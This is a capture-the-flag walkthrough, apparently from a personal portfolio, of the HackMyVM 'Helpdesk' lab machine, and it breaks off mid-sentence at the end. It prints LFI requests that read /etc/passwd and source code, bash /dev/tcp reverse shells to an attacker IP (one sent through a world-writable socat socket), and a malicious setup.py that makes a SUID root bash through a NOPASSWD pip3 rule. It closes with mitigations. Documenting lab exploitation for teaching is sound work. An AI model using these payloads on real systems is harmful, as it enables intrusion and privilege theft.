---
title: HackMyVM - Helpdesk Walkthrough
description: Step-by-step walkthrough of the Helpdesk vulnerable machine.
publishDate: "2025-09-19T16:00:00Z"
---

![Pwned machine](/portfolio/Helpdesk_Pwned.png)  
*Figure 1: Pwned machine*

# HackMyVM — Helpdesk Walkthrough

**Step-by-step walkthrough of the Helpdesk vulnerable machine.**

---

## Introduction

This walkthrough demonstrates the process of identifying and exploiting vulnerabilities on the **Helpdesk** machine from HackMyVM. The machine simulates a corporate helpdesk portal and is designed to teach web enumeration, Local File Inclusion (LFI), log/parameter discovery, socket abuse, and privilege escalation via a misconfigured sudo rule.

---

## Description

**HelpDesk** is a beginner-friendly CTF that revolves around a web app vulnerable to **LFI**. Using LFI we obtain source code and credentials, gain a web-based foothold with a reverse shell, escalate to the `helpdesk` user by abusing a world-writable UNIX socket, and ultimately escalate to **root** by abusing a `NOPASSWD` `pip3 install` sudo rule.

---

## Lab setup

- **Attacker**: Kali Linux (host) — `192.168.56.101`  
- **Target**: Helpdesk VM — `192.168.56.102`  
- **Virtualization**: Oracle VirtualBox (isolated lab network)  
- **Tools**: `nmap`, `feroxbuster`, `ffuf`, `curl`, `nc`, `socat`, `sudo`, `pip3`

---

## Reconnaissance

Scan the target:

```bash
nmap -T4 -A -v 192.168.56.102
```

**Relevant results:**

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu ...
80/tcp open  http    Apache httpd
|_http-title: HelpDesk Ticket System
```

> **Observation:** Apache web server hosting a HelpDesk ticket system (HTTP) and SSH.

### Tip — Local DNS mapping

Add a hosts entry for convenience:

```
192.168.56.102  helpdesk
```

You can then use `http://helpdesk/` instead of the raw IP.

---

## Directory enumeration

Run `feroxbuster` to discover web endpoints:

```bash
feroxbuster --url "http://helpdesk/" \
  --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x .php,.html -s 301,302
```

**Notable endpoints found:**

- `/login.php`  
- `/index.php`  
- `/ticket.php`  
- `/panel.php` → redirects to `login.php`  
- `/debug.php`

`ticket.php` looked like a ticket viewer — it warranted parameter fuzzing.

---

## Parameter fuzzing on `ticket.php`

Suspecting hidden parameters, `ffuf` was used to fuzz parameter names:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u 'http://helpdesk/ticket.php?FUZZ=id' --fw 24
```

**Result:** the parameter `url` returned distinct content with status 200 — an indicator it is processed by the application and could be vulnerable to LFI.

---

## Testing the `url` parameter — LFI

Test LFI by requesting a local file:

```
http://helpdesk/ticket.php?url=/etc/passwd
```

Response contained `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
...
helpdesk:x:1001:1001::/home/helpdesk:/bin/bash
```

> **Confirmed:** `ticket.php?url=` is vulnerable to **Local File Inclusion**.

---

## Viewing `login.php` source via LFI

Include the login page to inspect source code:

```bash
curl "http://helpdesk/ticket.php?url=login.php"
```

Found:

```php
// Stored credentials
$stored_user = 'helpdesk';

// SHA-512 hash for password: ticketmaster
$stored_hash = '$6$ABC123$fLo2MacCV...';
```

> Username: `helpdesk` — password hash corresponds to `ticketmaster`.

---

## Remote command panel & initial access

The discovered credentials worked on the web panel (SSH login failed). The panel provided a remote command interface.

Start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

Trigger a reverse shell from the web panel:

```bash
bash -c "bash -i >& /dev/tcp/192.168.56.101/4444 0>&1"
```

Listener output:

```
listening on [any] 4444 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 35698
bash: cannot set terminal process group (847): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$
```

Check identity:

```bash
id
```

Result:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have a shell as `www-data`.

---

## Enumeration from web shell — looking for escalation paths

List `/opt`:

```bash
ls -la /opt
```

Output:

```
drwxr-xr-x  2 root root      4096 Aug 16 16:13 dev_server
drwxr-xr-x  2 helpdesk helpdesk 4096 Sep 18 17:33 helpdesk-socket
```

`/opt/helpdesk-socket` contains:

```
-rwxr-xr-x 1 helpdesk helpdesk 158 Aug 16 15:32 handler.sh
srwxrwxrwx 1 helpdesk helpdesk   0 Sep 18 17:33 helpdesk.sock
-rw-r--r-- 1 root     root     184 Aug 16 15:44 serve.sh
```

View `serve.sh`:

```bash
cat serve.sh
```

Contents:

```bash
#!/bin/bash

SOCKET="/opt/helpdesk-socket/helpdesk.sock"

[ -e "$SOCKET" ] && rm "$SOCKET"

/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh
```

**Interpretation (short):** `serve.sh` starts a world-writable UNIX socket (`helpdesk.sock`). Each connection executes `handler.sh`. Any user can send commands — a potential escalation vector.

---

## Escalating to `helpdesk` via the writable socket

On the attacker machine start a listener:

```bash
nc -lvnp 5555
```

Send a reverse shell payload through the socket:

```bash
echo "/bin/bash -i >& /dev/tcp/192.168.56.101/5555 0>&1" | socat - /opt/helpdesk-socket/helpdesk.sock
```

Listener shows a new connection and shell:

```
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 59514
bash: cannot set terminal process group (676): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ id
uid=1001(helpdesk) gid=1001(helpdesk) groups=1001(helpdesk)
```

> We are now the `helpdesk` user.

---

## Privilege escalation to root — abusing sudo `pip3 install`

Check sudo rights:

```bash
sudo -l
```

Relevant output:

```
User helpdesk may run the following commands on helpdesk:
    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *
```

This allows `helpdesk` to run `pip3 install` as root **without a password**. `setup.py` executes arbitrary code — route to root.

### Build malicious package

Create folder and `setup.py`:

```bash
mkdir /tmp/evil && cd /tmp/evil
cat > setup.py << 'EOF'
from setuptools import setup
import os

os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")

setup(
    name="evil",
    version="0.1",
    description="evil package",
    py_modules=[]
)
EOF
```

Or one-liner:

```bash
echo 'from setuptools import setup; import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); setup(name="evil", version="0.1", description="evil package", py_modules=[])' > /tmp/evil/setup.py
```

Install using sudo:

```bash
sudo /usr/bin/pip3 install --break-system-packages .
```

`pip` runs `setup.py` as root. Expected output:

```
Successfully built evil
Successfully installed evil-0.1
```

### Get a root shell

A SUID copy of bash was created at `/tmp/rootbash`. Run it with `-p` to preserve privileges:

```bash
/tmp/rootbash -p
```

Capture flags:

```bash
cat /root/root.txt /home/helpdesk/user.txt
```

Result:

```
flag{request_has_been_escalated}
flag{ticket_approved_by_thedesk}
```

---

## Summary & remediation

**Attack path summary:**

1. `nmap` → identify HTTP service  
2. `feroxbuster` → find `ticket.php`  
3. `ffuf` → discover `url` parameter  
4. LFI → read files  
5. LFI → recover credentials  
6. Web panel → reverse shell as `www-data`  
7. Writable UNIX socket → reverse shell as `helpdesk`  
8. `sudo -l` → `pip3 install` NOPASSWD → malicious package → root shell

**Mitigations & lessons learned:**

- Sanitize file inclusion parameters — whitelist paths.  
- Avoid storing credentials in source code.  
- Protect UNIX sockets — avoid `mode=777`.  
- Restrict sudo rules — avoid interpreters as `NOPASSWD`.  
- Audit tools like socat — restrict interfaces accessible by untrusted users.

---

## Conclusion

Helpdesk demonstrates how chained misconfigurations — LFI, expo